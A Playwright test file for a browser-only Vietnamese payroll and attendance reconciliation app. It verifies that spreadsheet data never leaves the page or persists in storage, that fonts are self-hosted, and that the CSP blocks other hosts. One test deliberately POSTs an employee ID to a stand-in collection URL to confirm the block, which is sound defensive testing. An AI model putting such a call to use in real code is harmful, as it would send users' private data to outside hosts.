/**
 * AC-09 / spec §17: no request carries file content, nothing leaves the app origin, and nothing
 * from the files is persisted in browser storage after a run.
 */
import { expect, test, type Page } from '@playwright/test';
import {
  fixtures,
  recordRequests,
  runToResult,
  textCellValues,
  uploadFixtures,
  type RecordedRequest,
} from './helpers';

/** Cell values that must never appear in a request: every text cell of the 6 fixtures. */
const SECRETS = textCellValues([...fixtures('bang_luong_'), ...fixtures('cham_cong_')]);

function leaks(requests: RecordedRequest[]): string[] {
  const found: string[] = [];
  for (const r of requests) {
    const haystacks = [decodeURIComponent(r.url), r.url, r.body];
    for (const s of SECRETS) {
      const enc = Buffer.from(s, 'utf8').toString('latin1');
      if (
        haystacks.some((h) => h.includes(s) || h.includes(enc) || h.includes(encodeURIComponent(s)))
      ) {
        found.push(`${r.method} ${r.url} contains "${s}"`);
      }
    }
  }
  return found;
}

async function fullSession(page: Page): Promise<void> {
  await uploadFixtures(page);
  await runToResult(page);
  // Exercise row paging + filters + both downloads (validation report is only shown on issues).
  await page.getByRole('tab', { name: /Chỉ có trong lương/ }).click();
  await page.getByRole('tab', { name: /Lệch/ }).click();
  await page.getByLabel('Chi nhánh').selectOption('CN02');
  const [download] = await Promise.all([
    page.waitForEvent('download'),
    page.getByRole('button', { name: /^Tải Excel/ }).click(),
  ]);
  await download.path();
}

async function storageDump(page: Page): Promise<string> {
  return page.evaluate(async () => {
    const out: Record<string, unknown> = {};
    const dump = (s: Storage) =>
      Object.fromEntries(
        Array.from({ length: s.length }, (_, i) => s.key(i)!).map((k) => [k, s.getItem(k)]),
      );
    out.local = dump(localStorage);
    out.session = dump(sessionStorage);
    out.idb = (await indexedDB.databases()).map((d) => d.name);
    out.caches = 'caches' in self ? await caches.keys() : [];
    out.sw = (await navigator.serviceWorker?.getRegistrations())?.length ?? 0;
    out.cookie = document.cookie;
    return JSON.stringify(out);
  });
}

test.describe('AC-09 data stays in the browser', () => {
  test('every request is a same-origin GET of a static asset, none carries cell values', async ({
    page,
  }) => {
    const requests = recordRequests(page);
    await fullSession(page);

    expect(SECRETS.length).toBeGreaterThan(100); // sanity: names + IDs were collected
    expect(SECRETS).toContain('NV00001');
    expect(leaks(requests)).toEqual([]);

    const origin = new URL(page.url()).origin;
    const offOrigin = requests.filter((r) => {
      const u = new URL(r.url);
      if (u.protocol === 'blob:' || u.protocol === 'data:') return false;
      return u.origin !== origin;
    });
    expect(offOrigin.map((r) => `${r.method} ${r.url}`)).toEqual([]);

    // Same-origin traffic is only the app shell + static assets: no POST/PUT, no XHR/fetch to APIs.
    const sameOrigin = requests.filter((r) => r.url.startsWith(origin));
    expect(sameOrigin.filter((r) => r.method !== 'GET').map((r) => r.url)).toEqual([]);
    for (const r of sameOrigin) {
      const path = new URL(r.url).pathname;
      expect(path, `${r.resourceType} ${r.url}`).toMatch(
        // App icons in public/ are the only non-hashed static files.
        /^\/($|run\/|assets\/[\w.-]+\.(js|css|woff2?)$|favicon\.svg$|icon-[\w-]+\.png$|apple-touch-icon\.png$|manifest\.webmanifest$)/,
      );
      expect(r.body).toBe('');
    }
    // The worker chunk is loaded (proves the recorder sees worker traffic too).
    expect(sameOrigin.some((r) => /\/assets\/worker-[\w-]+\.js$/.test(r.url))).toBe(true);

    const dump = await storageDump(page);
    for (const s of SECRETS) expect(dump.includes(s), `storage contains "${s}"`).toBe(false);
    expect(JSON.parse(dump)).toEqual({
      local: {},
      session: {},
      idb: [],
      caches: [],
      sw: 0,
      cookie: '',
    });
  });

  test('Be Vietnam Pro is self-hosted: woff2 from /assets, rendered, no font origin in the CSP', async ({
    page,
  }) => {
    const requests = recordRequests(page);
    const response = await page.goto('/');
    await expect(page.getByRole('heading', { level: 1 })).toBeVisible();
    await page.evaluate(() => document.fonts.ready);
    // Vietnamese text on the page pulls in both subsets (unicode-range).
    const loaded = await page.evaluate(() => {
      const weights: string[] = [];
      document.fonts.forEach((f: FontFace) => {
        if (f.family.replace(/"/g, '') === 'Be Vietnam Pro' && f.status === 'loaded') {
          weights.push(f.weight);
        }
      });
      return weights;
    });
    expect(loaded.length).toBeGreaterThan(0);
    expect(
      await page.evaluate(() => getComputedStyle(document.querySelector('h1')!).fontFamily),
    ).toMatch(/^"?Be Vietnam Pro"?/);
    const origin = new URL(page.url()).origin;
    const fonts = requests.filter((r) => r.resourceType === 'font');
    expect(fonts.length).toBeGreaterThan(0);
    for (const r of fonts) {
      expect(r.url.startsWith(`${origin}/assets/be-vietnam-pro-`), r.url).toBe(true);
      expect(r.url).toMatch(/-(latin|vietnamese)-[4-8]00-normal-[\w-]+\.woff2$/);
    }
    expect(
      requests.filter((r) => !r.url.startsWith(origin) && !/^(blob|data):/.test(r.url)),
    ).toEqual([]);
    const csp = response?.headers()['content-security-policy'] ?? '';
    expect(csp).toContain("font-src 'self';");
    expect(csp).toContain("style-src 'self' 'unsafe-inline';");
    expect(csp).not.toMatch(/googleapis|gstatic/);
    expect(
      await page.locator('link[href*="fonts.googleapis"], link[href*="gstatic"]').count(),
    ).toBe(0);
  });

  test('CSP connect-src blocks the page and the worker origin from calling other hosts', async ({
    page,
  }) => {
    const response = await page.goto('/');
    const csp = response?.headers()['content-security-policy'] ?? '';
    expect(csp).toContain("connect-src 'self'");
    expect(csp).not.toMatch(/connect-src[^;]*\*/);
    const blocked = await page.evaluate(async () => {
      try {
        await fetch('https://example.org/collect', { method: 'POST', body: 'NV00001' });
        return false;
      } catch {
        return true;
      }
    });
    expect(blocked).toBe(true);
  });
});
